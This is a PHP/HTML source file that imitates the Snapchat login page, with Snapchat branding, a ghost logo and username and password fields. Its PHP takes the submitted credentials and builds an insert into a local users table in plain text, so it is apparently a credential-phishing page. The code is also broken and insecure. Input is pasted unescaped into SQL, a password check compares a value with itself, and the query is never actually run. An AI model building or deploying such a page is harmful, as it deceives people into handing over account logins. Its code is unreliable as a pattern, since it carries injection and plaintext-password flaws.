<?php 
  session_start();
  $db = mysqli_connect("localhost", "root", "", "database");

  if (isset($_POST['register_btn'])){
    session_start();
    $username = ($_POST['username']);   
      
    $password = ($_POST['password']);
    

    if ($password == $password) {
      $password = ($password);
      $sql = "INSERT INTO users(username,password) VALUES('$username', '$password')";
      
      $_SESSION['message'] = "Successful";
      $_SESSION['username'] = $username;
      header("location: home.php");

    }else{
      $_SESSION['message'] = "Passwords do not match";
    }

  }
?>
<!DOCTYPE html>
<html>
<head>
  <title>Security • Snapchat</title>
  <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
  <div class="header">
    <img src="ghost.png" alt="Ghost" width="72" height="68">
  </div>
  <div class= "loginbox">
  <form method="post" action="login.php">
    <table>
      <tr>
        <td><h2>Log into Snapchat</h2></td>
      </tr>
      
      <tr>
        <div class="usernameColorChange"><td><h1>Username or Email</h1></td><br></div>
      </tr>
      <tr>
        <div class="usernameColorChange"><td><input type="text" name="username" class="textInput"></td></div>
      </tr>
    
      <tr>

        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <div>
      <tr>
        <td><h1>Password</h1></td>
      </tr>
      <tr>
        <td><input type="password" name="password" class="textInput"></td>
      </tr>
    </div>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><td>
      </tr>
      <tr>
        <td><input type="submit" name="register_btn" value ="Log In" class="button"></td>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
        </tr>
      <tr>
      </tr>
      <tr>

      </tr>
      <tr>
      </tr>
      <tr>
      </tr>
      <tr>
        <center><td><a class="blue" href="https://accounts.snapchat.com/accounts/password_reset_request">Forgot password / Create Account</a></td></center>
      </tr>
    </table>

  </form>
</div>


</body>
</html>